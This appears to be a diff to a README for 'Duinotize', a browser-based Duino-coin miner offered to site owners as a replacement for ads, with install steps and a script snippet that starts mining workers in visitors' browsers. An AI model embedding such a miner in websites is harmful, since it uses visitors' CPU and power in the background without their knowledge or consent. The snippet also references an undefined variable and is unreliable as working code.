@@ -4,12 +4,14 @@ _Duino-coin webminer/website monetizer_
 Tired of showing users ads? Use Duinotize! It's a modified version of the Duino-coin web miner designed to be integrated into any website 
 
 ## Installation
-Put the following code at the very bottom of the page where you want the miner to start: (most likley your home page, as the miner will run in the background for the duration your visiters are on the site, not just the page)
+Download [miner.js](https://github.com/mobilegmYT/Duinotize/raw/main/miner.js) + [hashes.js](https://github.com/mobilegmYT/Duinotize/raw/main/hashes.js), and put them in a new folder named `worker` in your website's root folder. For a example of how this is setup, look at https://github.com/Amog-OS/website, and you can also visit https://www.amogos.studio/ and open the dev console to see the code in action.
+
+Put the following code at the very bottom of the HTML page where you want the miner to start: (most likley your home page, as the miner will run in the background for the duration your visiters are on the site, not just the page)
 ```
 <script>
 let threads = "1";
 for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
-    let socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/miner.js");
+    let socketWorker = new Worker("worker/miner.js");
     socketWorker.postMessage('Start,' + "username" + "," + "rigid" + "," + "0" + "," + Math.floor(Math.random() * 2811) + "," + "difficulty");
     workerVer++;
 }
